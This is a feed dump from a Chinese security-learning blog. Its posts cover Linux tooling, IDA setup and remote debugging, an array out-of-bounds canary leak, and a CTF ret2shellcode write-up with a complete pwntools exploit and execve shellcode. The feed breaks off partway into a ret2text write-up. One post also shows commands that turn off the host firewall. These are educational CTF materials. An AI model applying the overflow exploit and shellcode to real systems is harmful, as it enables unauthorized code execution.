&lt;p&gt;本文转载自：&lt;a href=&quot;https://cloud.tencent.com/developer/article/1878840&quot;&gt;Linux查看内核版本命令&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;使用uname命令查找l</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="内核版本" scheme="https://www.rgzzplus.com/tags/%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>linux软件安装包依赖问题</title>
    <link href="https://www.rgzzplus.com/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/"/>
    <id>https://www.rgzzplus.com/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</id>
    <published>2022-09-05T13:27:21.000Z</published>
    <updated>2022-09-05T13:45:42.797Z</updated>
    
    <content type="html"><![CDATA[<p>当我首次使用pwndbg的heap指令的时候：<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901192451610.png" alt="image-20220901192451610"></p><p>说是缺少依赖，需要我安装一些库文件</p><p>但是当我去安装这些库的时候却发生了依赖冲突<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901192638567.png" alt="image-20220901192638567"></p><p>发现，是我的libc6，太新了，需要安装回旧版本的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install  libc6=2.31-0kylin9.2</span><br></pre></td></tr></table></figure><p>安装完旧版本的库后，就能安装 libc6-dbg 啦！<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901192829669.png" alt="image-20220901192829669"></p><p>再去 heap，就能看到信息了<br><img src="/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/image-20220901193217714.png" alt="image-20220901193217714"></p><blockquote><p>参考：<a href="https://www.cnblogs.com/EasonJim/p/7144017.html">查看指定软件所有版本</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当我首次使用pwndbg的heap指令的时候：&lt;br&gt;
&lt;img src=&quot;/2022/09/05/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="安装包依赖" scheme="https://www.rgzzplus.com/tags/%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96/"/>
    
  </entry>
  
  <entry>
    <title>数组越界访问</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/</id>
    <published>2022-09-05T13:27:08.000Z</published>
    <updated>2022-09-05T13:44:04.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-数组越界"><a class="markdownIt-Anchor" href="#1-数组越界"></a> 1 数组越界</h1><p>先区分一下<strong>数组越界漏洞</strong>和<strong>溢出漏洞</strong>：</p><ul><li>数组越界访问包含读写类型</li><li>溢出属于数据写入</li><li>部分溢出漏洞本质确实就是数组越界漏洞。</li></ul><p>数组越界就像是倒水的时候倒错了杯子，溢出就像是水从杯子里溢出来。</p><h2 id="11-原理"><a class="markdownIt-Anchor" href="#11-原理"></a> 1.1 原理</h2><p><strong>堆中</strong>的数组越界： 因为堆是我们自己分配的，如果越界会把堆中其他空间的数据写掉或着读取其他空间的数据。如果是变量则会引起数值改变，如果是指针则可能会引起crash。</p><p><strong>栈中</strong>的数组越界：因为栈是向下增长的，进入函数前，会把参数和下一条指令地址压栈，如果覆盖了当前函数的ebp（栈底），那么栈还原时esp（栈顶）就不正确指向，从而发送未知错误（大部分是程序崩溃退出），ebp后面的返回地址也被覆盖那么程序执行流程则可被控制。</p><p>下面代码为例分析数组越界访问漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">3</span>] = &#123;<span class="number">111</span>,<span class="number">222</span>,<span class="number">333</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入数组索引下标：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输出数组元素：array[%d] = %d\n&quot;</span>, index, <span class="built_in">array</span>[index]);</span><br><span class="line">    <span class="comment">//array[index] = 1;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行生成的程序，然后分别输入2 和 4 作为数组下标，输出结果如下，当输入的数组下标为 0、1、2 的时候，会得到正常数值，但是从索引3开始就超出了原来的数组 array 的范围，比如输入4，将会数组越界访问栈中的值，导致读取不在程序控制范围内的数值。</p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162857184.png" alt="image-20220904162857184"></p><p>使用gdb调试发现array[4] 就是从 array 开始的第六个数据0x4012A9，已经读取到了array之外的数据，如果越界访问距离过大，就会访问到不可访问的内存空间，导致程序崩溃。</p><p>我们可以利用这种方式来取得栈上的 canary，进而绕过canary。</p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162631275.png" alt="image-20220904162631275"></p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162118330.png" alt="image-20220904162118330"></p><p>canary = 0x3dd8e70f8 =1037625103<sub>10</sub></p><p><img src="/2022/09/05/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/image-20220904162735865.png" alt="image-20220904162735865"></p><p>这里我们已经取得了栈中 canary 的值，接下来只要通过栈溢出，进行覆盖，并把 canary 放入 [rbp-0x8] 就能控制程序去执行 shellcode 了。</p><p>0x9d5720fbb2e21300</p><blockquote><p>参数：</p><p>​<a href="https://bbs.pediy.com/thread-246490.htm">整数溢出+数组越界</a></p><p>​漏洞战争</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-数组越界&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-数组越界&quot;&gt;&lt;/a&gt; 1 数组越界&lt;/h1&gt;
&lt;p&gt;先区分一下&lt;strong&gt;数组越界漏洞&lt;/strong&gt;和&lt;strong&gt;溢出漏洞&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="数组越界" scheme="https://www.rgzzplus.com/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>IDA远程调试</title>
    <link href="https://www.rgzzplus.com/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <id>https://www.rgzzplus.com/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</id>
    <published>2022-09-05T13:26:31.000Z</published>
    <updated>2022-09-05T13:43:24.310Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考：</p><p>​<a href="https://www.cnblogs.com/2014asm/p/10098005.html">linux漏洞分析入门笔记-栈溢出</a></p><p>​<a href="https://blog.csdn.net/u014101410/article/details/102853014">Windows下IDA远程调试Linux程序，无法连接</a></p></blockquote><blockquote><p>ida7.5</p><p>kylin v10</p></blockquote><h2 id="0x00环境配置"><a class="markdownIt-Anchor" href="#0x00环境配置"></a> 0x00:环境配置</h2><p>使用IDA远程调试Linux程序步骤如下：</p><p>\1. 在进行远程调试之前需要对Linux平台进行一些准备工作。在IDA的安装目录中的dbgsrv文件夹中，选择linux_server或者linux_serverx64复制到需要调试Linux程序所在的目录下。将复制过来的文件赋予执行权限chmod 777 linux_server*。执行该文件./linux_server或者./linux_server64。</p><p>\2. 在IDA中选择菜单Debugger-Run-Remote Linux debugger。如图。分别将程序所在位置，程序所在目录，参数（没有可不写），主机IP，主机端口，点击OK。相对路径路径要填写相对</p><p>linux_server或者linux_serverx64的相对路径。</p><p><img src="/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/693524-20181210175845721-2080206661.jpg" alt="img"></p><p>图1</p><p><img src="/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/693524-20181210180102331-1234975417.jpg" alt="img"></p><p>图2</p><p><img src="https://img2018.cnblogs.com/blog/693524/201812/693524-20181210180122795-1138987496.jpg" alt="img"></p><p>图3</p><p>\3. 此时，下关键函数下好断点后，即可进行动态调试，如下图：</p><p><img src="/2022/09/05/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/693524-20181210180219408-1171249507.jpg" alt="img"></p><p>图4</p><p>常用快捷键包括：</p><p>a. 单步步过：F8</p><p>b. 单步步入：F7</p><p>c. 执行到光标位置：F4</p><p>d. 设置断点：F2</p><p>e. 顺序执行：F9</p><h2 id="0x01-问题"><a class="markdownIt-Anchor" href="#0x01-问题"></a> 0x01 问题</h2><p>您在远程调试过程中，可能出现能ping通，但就是连不上的情况，这可能是因为您开启了防火墙。</p><p>centos从7开始默认用的是firewalld，这个是基于iptables的，虽然有iptables的核心，但是iptables的服务是没安装的。所以你只要停止firewalld服务即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop firewalld.service &amp;&amp; sudo systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><p>如果是其他的系统，在linux中关闭防火墙即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure><p>ubuntu或者centos都可以用以上方法解决，如果是kali的话，获取到ip，直接sudo执行linux_server即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&quot;https://www.cnblogs.com/2014asm/p/10098005.html&quot;&gt;linux漏洞分析入门笔记-栈溢出&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&quot;https://blo</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="IDA" scheme="https://www.rgzzplus.com/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>linux安装ida</title>
    <link href="https://www.rgzzplus.com/2022/09/05/linux%E5%AE%89%E8%A3%85ida/"/>
    <id>https://www.rgzzplus.com/2022/09/05/linux%E5%AE%89%E8%A3%85ida/</id>
    <published>2022-09-05T13:26:17.000Z</published>
    <updated>2022-09-05T13:42:51.734Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载自：<strong><a href="https://github.com/AngelKitty/IDA7.0">安装IDA7.0</a></strong></p><p>以 Ubuntu18.04 为例。您可以将<a href="https://github.com/AngelKitty/IDA7.0/blob/master/idafree70_linux.run">idafree70_linux.run</a>下载到本地主机，然后使用以下命令安装 IDA。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/AngelKitty/IDA7.0.git</span><br><span class="line">cd IDA7.0/</span><br><span class="line">chmod +x idafree70_linux.run</span><br><span class="line">./idafree70_linux.run</span><br></pre></td></tr></table></figure><p>如果您之前没有安装过 git，可以运行以下命令来获取 git。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>下载完成后，在该目录下打开命令行，并运行 <code>./ida</code> ，进入安装步骤。</p><p>然后您必须单击“下一步”才能完成安装。遇到安装目录解决方案时，建议更改默认路径，然后选择<code>/opt/...</code>IDA要安装的目录。</p><p>然后创建一个指向该<code>/usr/bin</code>文件夹的符号链接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /opt/idafree-7.0/ida64 /usr/bin</span><br></pre></td></tr></table></figure><p>然后你可以测试 ida64 命令，它应该可以工作。</p><p>也许你遇到了“Package ‘libstdc++.so.5’ has no installation Candidate”这样的问题，可以运行以下命令来解决。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libstdc++5:i386</span><br></pre></td></tr></table></figure><p>然后你就可以开始你的ida之旅了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;strong&gt;&lt;a href=&quot;https://github.com/AngelKitty/IDA7.0&quot;&gt;安装IDA7.0&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以 Ubuntu18.04 为例。您可以将&lt;a href=&quot;https://github.co</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="IDA" scheme="https://www.rgzzplus.com/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>查看glibc版本号</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/</id>
    <published>2022-09-05T13:26:04.000Z</published>
    <updated>2022-09-05T13:34:31.809Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载于：<a href="https://www.cnblogs.com/motadou/p/4473966.html">glibc查看版本号</a></p></blockquote><p>glibc是标准C库的GNU实现。我们采用C/C++所写的程序，运行时基本都依赖与它。如果我们想看当前机器glibc的源代码，首先需要知道当前机器glibc的版本号，然后到glibc的官网下载对应版本的源代码。</p><h3 id="查看当前机器glibc的版本号"><a class="markdownIt-Anchor" href="#查看当前机器glibc的版本号"></a> 查看当前机器glibc的版本号</h3><p>第一种方法：使用命令ldd，查看可执行程序依赖libc的路径。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200424135401650-138960923.png" alt="img"><br>由上可知，系统采用的是libc-2.19.so的动态库，那么glibc的版本号是2.19。</p><p>第二种方法：执行libc.so查看输出的glibc编译信息，里面包含了版本号。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200427101256592-1321326922.png" alt="img"></p><p>第三种方法：使用命令 ldd --version（ldd是glibc提供的命令，由此可知glibc的版本号）。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200424135802159-1955290017.png" alt="img"></p><p>第四种方法：使用命令 getconf GNU_LIBC_VERSION。<br><img src="/2022/09/05/%E6%9F%A5%E7%9C%8Bglibc%E7%89%88%E6%9C%AC%E5%8F%B7/47736-20200424140519131-472352609.png" alt="img"></p><blockquote><p>下载glibc源代码</p><p>glibc官网地址：<a href="https://www.gnu.org/software/libc/">https://www.gnu.org/software/libc/</a><br>glibc源代码包：<a href="https://ftp.gnu.org/gnu/glibc/">https://ftp.gnu.org/gnu/glibc/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文转载于：&lt;a href=&quot;https://www.cnblogs.com/motadou/p/4473966.html&quot;&gt;glibc查看版本号&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;glibc是标准C库的GNU实现。我们采用C/C+</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="glibc版本号" scheme="https://www.rgzzplus.com/tags/glibc%E7%89%88%E6%9C%AC%E5%8F%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux查看系统进程</title>
    <link href="https://www.rgzzplus.com/2022/09/05/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/"/>
    <id>https://www.rgzzplus.com/2022/09/05/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/</id>
    <published>2022-09-05T13:25:27.000Z</published>
    <updated>2022-09-05T13:33:47.013Z</updated>
    
    <content type="html"><![CDATA[<p>本文转载于：<a href="https://cloud.tencent.com/developer/article/1711858">LINUX查看进程的4种方法(小结)</a></p><p>进程是在 CPU 及内存中运行的程序代码，而每个进程可以创建一个或多个进程（父子进程）。</p><p><strong>查看进程方法：</strong></p><p><strong>第一种：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure><p>**ps命令用于报告当前系统的进程状态。**可以搭配kill指令随时中断、删除不必要的程序。ps命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。</p><p>a：显示当前终端下的所有进程信息，包括其他用户的进程。</p><p>u：使用以用户为主的格式输出进程信息。</p><p>x：显示当前用户在所有终端下的进程。</p><p>示例：</p><p><img src="/2022/09/05/Linux%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/1620.png" alt="img"></p><p><strong>上图中各字段解释：</strong></p><p>USER：启动该进程的用户账号名称 PID：该进程的ID号，在当前系统中是唯一的 %CPU：CPU占用的百分比 %MEM：内存占用的百分比</p><p>VSZ：占用虚拟内存（swap空间）的大小 RSS：占用常驻内存（物理内存）的大小</p><p>TTY：该进程在哪个终端上运行。“？”表未知或不需要终端 STAT：显示了进程当前的状态，如S（休眠）、R（运行）、Z（僵死）、&lt;（高优先级）、N（低优先级）、s（父进程）、+（前台进程）。对处于僵死状态的进程应予以手动终止。</p><p>START：启动该进程的时间 TIME：该进程占用CPU时间 COMMAND：启动该进程的命令的名称</p><p><strong>总结：ps aux 是以简单列表的形式显示出进程信息。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载于：&lt;a href=&quot;https://cloud.tencent.com/developer/article/1711858&quot;&gt;LINUX查看进程的4种方法(小结)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;进程是在 CPU 及内存中运行的程序代码，而每个进程可以创建一个或多个进程（父</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="系统进程" scheme="https://www.rgzzplus.com/tags/%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ret2shellcode</title>
    <link href="https://www.rgzzplus.com/2022/09/05/ret2shellcode/"/>
    <id>https://www.rgzzplus.com/2022/09/05/ret2shellcode/</id>
    <published>2022-09-05T11:54:06.000Z</published>
    <updated>2022-09-05T11:56:29.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h1><blockquote><p><a href="https://www.ctfhub.com/#/skilltree">题目地址</a></p></blockquote><p>拿到题目，首先看看文件类型，以及保护机制。<br><img src="/2022/09/05/ret2shellcode/image-20220903235214002.png" alt="image-20220903235214002"></p><p>我们发现它缺少执行权限，加上权限后执行，是简单的输入输出，不过这里似乎给到我们了一个地址。</p><h1 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h1><p>接下来，把程序拖入 ida，反汇编看看：<br><img src="/2022/09/05/ret2shellcode/image-20220904000019546.png" alt="image-20220904000019546"></p><p>我们发现这个程序中并没有关于 flag 的相关信息，所以我们推测 flag 存放在服务器上。</p><p>还发现程序通过 read() 把输入存入buf[]，也没有保护机制保护栈，这就给了我们栈溢出的机会。<br>还记得我们前面提到的那个输出的地址吗，从反汇编代码可以看出，它就是 buf 的地址。</p><h1 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h1><p>这样我们就有了溢出思路，通过输入字符串一直覆盖掉 rbp，制造栈溢出。<br>通过题目名称 ret2shellcode，也能知道最后一定要获得 shell 的。但我并未在程序中发现关于获得 sh 的代码，那就只能自己写了。</p><h1 id="0x4"><a class="markdownIt-Anchor" href="#0x4"></a> 0x4</h1><p>梳理一下我们<strong>需要获得的信息</strong>：</p><ul><li>buf[] 的地址</li><li>buf[] 与 rbp 的距离</li><li>shellcode</li></ul><p>（ 1）buf[] 的地址，就在输出中，我们要想办法把它提取出来。<br><img src="/2022/09/05/ret2shellcode/image-20220904002822097.png" alt="image-20220904002822097"></p><blockquote><p><code>recvuntil</code>( <em>delims</em> , <em>drop=False</em> , <em>timeout=default</em> ) → 字节[<a href="https://github.com/Gallopsled/pwntools/blob/493a3e3d92/pwnlib/tubes/tube.py#L273-L361">资源]</a></p><p>接收数据，直到遇到delims之一。</p><p>如果在<code>timeout</code>几秒内没有满足请求，所有数据都会被缓冲并返回一个空字符串 ( <code>''</code>)。</p><ul><li><pre><code>  参数：</code></pre><strong>delims</strong> ( <a href="https://docs.python.org/3.8/library/stdtypes.html#bytes"><em>bytes</em></a> <em>,</em> <a href="https://docs.python.org/3.8/library/stdtypes.html#tuple"><em>tuple</em></a> ) — 分隔符的字节串，或分隔符字节串的列表。<br><strong>drop</strong> ( <a href="https://docs.python.org/3.8/library/functions.html#bool"><em>bool</em></a> ) – 删除结尾。如果<code>True</code>它从返回值的末尾移除。</li><li><pre><code>  Raises：  **exceptions.EOFError** — 连接在请求得到满足之前关闭         </code></pre></li><li><pre><code>  返回值：  包含从套接字接收到的字节的字符串，或者`''`如果在等待时发生超时。 </code></pre></li></ul><p>摘自：<a href="https://docs.pwntools.com/en/stable/tubes.html">pwntools</a></p></blockquote><p>（ 2）距离</p><p>方法一：看汇编代码，buf[] 与 rbp 的距离：0x10 + 8 = 24<sub>10</sub><br><img src="/2022/09/05/ret2shellcode/image-20220904002551439.png" alt="image-20220904002551439"></p><p>方法二： peda 调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda pwn</span><br><span class="line">pattern create 200     //制造200个填充字符（多少字符都行），先把他复制下来</span><br><span class="line">r                      //运行程序</span><br><span class="line"></span><br><span class="line">pattern offset 地址     //ret 地址，确定偏移</span><br></pre></td></tr></table></figure><p><img src="/2022/09/05/ret2shellcode/image-20220904002120603.png" alt="image-20220904002120603"></p><p><img src="/2022/09/05/ret2shellcode/image-20220904002141581.png" alt="image-20220904002141581"></p><p><img src="/2022/09/05/ret2shellcode/image-20220904002212274.png" alt="image-20220904002212274"></p><p><img src="/2022/09/05/ret2shellcode/image-20220904002358262.png" alt="image-20220904002358262"></p><p>( 3) shellcode</p><ul><li>可以自己编写，<a href="https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/">shellcode 开发入门</a></li><li>使用 pwntools 生成，<a href="http://shellcraft.sh">shellcraft.sh</a>()</li></ul><h1 id="0x5"><a class="markdownIt-Anchor" href="#0x5"></a> 0x5</h1><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p = connect(&#x27;challenge-47138fa4ef483fb7.sandbox.ctfhub.com&#x27;,33570)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(buf_addr)</span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)+<span class="number">32</span>)+shellcode</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input someting :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后远程连接获取 flag：ls 发现有一个flag文件，cat flag 即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x1&quot;&gt;&lt;/a&gt; 0x1&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/skilltree&quot;&gt;题目地址&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ret2shellcode" scheme="https://www.rgzzplus.com/tags/ret2shellcode/"/>
    
  </entry>
  
  <entry>
    <title>ret2text</title>
    <link href="https://www.rgzzplus.com/2022/09/05/ret2text/"/>
    <id>https://www.rgzzplus.com/2022/09/05/ret2text/</id>
    <published>2022-09-05T11:33:01.000Z</published>
    <updated>2022-09-11T05:24:55.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0"><a class="markdownIt-Anchor" href="#0x0"></a> 0x0</h1><p>配置好基本环境</p><ul><li>安装gdb：通过apt-get install build-essential安装基本的编译环境，都会带入gdb</li><li>安装peda：这是个python程序，对gdb功能进行了增强，例如带入了 checksec 程序，用来检查文件信息</li></ul><h1 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h1><blockquote><p><a href="https://www.ctfhub.com/#/skilltree">ret2text题目地址</a></p></blockquote><blockquote><p>参考：<a href="https://www.jianshu.com/p/4231b886ded5">ret2text（一道题入门）</a></p><p>​<a href="https://writeup.ctfhub.com/Skill/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/ofBtUNidwfzzuXMBNBr4SF.html">ret2text</a></p></blockquote><p>拿到一道题的第一步我们先去检查他的保护机制： <code>checksec pwn</code><br><img src="/2022/09/05/ret2text/image-20220903165751567.png" alt="image-20220903165751567"></p><p>所有安全措施 CANARY/FORTIFY/NX/PIE 都关闭了，说明该题不需要复杂的绕过操作</p><p><code>./pwn</code> 运行，显示缺少权限。<code>ll pwn</code> 后发现缺少执行权限，加权 <code>chmod +x pwn</code><br><img src="/2022/09/05/ret2text/image-20220903170125790.png" alt="image-20220903170125790"></p><p>执行，我发现，这里有一个输入，这时我们就要注意，有可能是一个栈溢出利用。<br><img src="/2022/09/05/ret2text/image-20220903170250704.png" alt="image-20220903170250704"></p><h1 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 